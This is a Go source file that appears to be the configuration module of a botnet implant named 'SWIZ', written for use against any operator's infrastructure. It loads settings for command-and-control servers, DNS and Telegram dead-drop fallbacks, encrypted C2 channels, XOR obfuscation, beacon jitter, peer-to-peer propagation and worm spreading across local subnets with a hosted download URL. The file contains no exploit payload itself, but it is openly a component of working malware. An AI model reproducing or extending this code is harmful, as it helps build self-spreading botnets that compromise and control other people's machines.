package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

// Config holds all runtime implant settings. Every knob is driven by
// environment variables so a single binary can be deployed against any
// operator infrastructure without rebuilds.
type Config struct {
	C2URLs     []string
	DNSDomain  string // TXT record domain for dynamic C2 discovery ("" disables)
	TGToken    string // Telegram bot API token for the dead-drop fallback
	TGChatID   string // Telegram chat filter ("" accepts any chat)
	BotSecret  string // shared secret sent as X-Bot-Secret to the C2
	BotKey     string // implant X25519 private key (hex) - enables the sealed channel
	OpPubKey   string // operator X25519 public key (hex) - encrypts results to the C2
	BotID      string
	XOR        byte
	Interval   time.Duration
	Jitter     time.Duration
	BackoffMax time.Duration

	P2P          bool
	PeerPort     int
	P2PBroadcast time.Duration

	WormSubnets     string // CSV override; empty = local /24
	WormDownloadURL string // hosted bot binary for cross-OS deployment
	WormRescan      time.Duration

	LogPath string
}

// Baked defaults are injected at compile time as a single opaque token by
// cmd/build (see cmd/bot/baked.go and internal/bakepack). Runtime env vars
// always win over baked values: env > baked > built-in default.

func envStr(name, def string) string {
	if v := os.Getenv(name); v != "" {
		return v
	}
	return def
}

func envList(name string) []string {
	var out []string
	for _, p := range strings.Split(os.Getenv(name), ",") {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

func envDur(name string, def time.Duration) time.Duration {
	if v := os.Getenv(name); v != "" {
		if d, err := time.ParseDuration(v); err == nil {
			return d
		}
	}
	return def
}

// envXOR accepts "0xAA" or "170".
func envXOR(name string, def byte) byte {
	v := os.Getenv(name)
	if v == "" {
		return def
	}
	n, err := strconv.ParseUint(strings.TrimPrefix(v, "0x"), 16, 8)
	if err != nil {
		n, err = strconv.ParseUint(v, 10, 8)
		if err != nil {
			return def
		}
	}
	return byte(n)
}

func envBool(name string, def bool) bool {
	v := os.Getenv(name)
	if v == "" {
		return def
	}
	b, err := strconv.ParseBool(v)
	if err != nil {
		return def
	}
	return b
}

// LoadConfig reads configuration from the environment with sane
// development defaults (local C2 on 127.0.0.1:8443).
func LoadConfig() Config {
	cfg := Config{
		C2URLs:          envList("SWIZ_C2_URLS"),
		BotKey:          envOr("SWIZ_BOT_KEY", bakedOf("bot_key")),
		OpPubKey:        envOr("SWIZ_C2_PUBKEY", bakedOf("op_pubkey")),
		DNSDomain:       os.Getenv("SWIZ_DNS_DOMAIN"),
		TGToken:         os.Getenv("SWIZ_TELEGRAM_TOKEN"),
		TGChatID:        os.Getenv("SWIZ_TELEGRAM_CHAT_ID"),
		BotSecret:       envOr("SWIZ_BOT_SECRET", bakedOf("bot_secret")),
		BotID:           os.Getenv("SWIZ_BOT_ID"),
		XOR:             envXOR("SWIZ_XOR", envXORDefault(bakedOf("xor"), 0xAA)),
		Interval:        envDur("SWIZ_INTERVAL", envDurDefault(bakedOf("interval"), 30*time.Second)),
		Jitter:          envDur("SWIZ_JITTER", 30*time.Second),
		BackoffMax:      envDur("SWIZ_BACKOFF_MAX", time.Hour),
		P2P:             envBool("SWIZ_P2P", false),
		PeerPort:        31337,
		P2PBroadcast:    envDur("SWIZ_P2P_BROADCAST", 10*time.Minute),
		WormSubnets:     os.Getenv("SWIZ_WORM_SUBNETS"),
		WormDownloadURL: os.Getenv("SWIZ_WORM_DOWNLOAD_URL"),
		WormRescan:      envDur("SWIZ_WORM_RESCAN", 10*time.Minute),
	}
	if v := os.Getenv("SWIZ_PEER_PORT"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n < 65536 {
			cfg.PeerPort = n
		}
	}
	if len(cfg.C2URLs) == 0 {
		if bakedURLs := bakedOf("c2_urls"); bakedURLs != "" {
			for _, p := range strings.Split(bakedURLs, ",") {
				if p = strings.TrimSpace(p); p != "" {
					cfg.C2URLs = append(cfg.C2URLs, p)
				}
			}
		}
	}
	if len(cfg.C2URLs) == 0 {
		cfg.C2URLs = []string{"https://127.0.0.1:8443"}
	}
	if cfg.BotID == "" {
		cfg.BotID = bakedOf("bot_id")
	}
	if cfg.BotID == "" {
		host, _ := os.Hostname()
		cfg.BotID = fmt.Sprintf("%s_%d", host, os.Getpid())
	}
	if cfg.LogPath == "" {
		cfg.LogPath = envStr("SWIZ_LOG", "")
	}
	return cfg
}

// envOr returns the environment value or a baked/fallback default.
func envOr(name, def string) string {
	if v := os.Getenv(name); v != "" {
		return v
	}
	return def
}

// envXORDefault parses a baked hex/default XOR value.
func envXORDefault(baked string, def byte) byte {
	if baked == "" {
		return def
	}
	if n, err := strconv.ParseUint(strings.TrimPrefix(baked, "0x"), 16, 8); err == nil {
		return byte(n)
	}
	return def
}

// envDurDefault parses a baked interval value.
func envDurDefault(baked string, def time.Duration) time.Duration {
	if baked == "" {
		return def
	}
	if d, err := time.ParseDuration(baked); err == nil {
		return d
	}
	return def
}
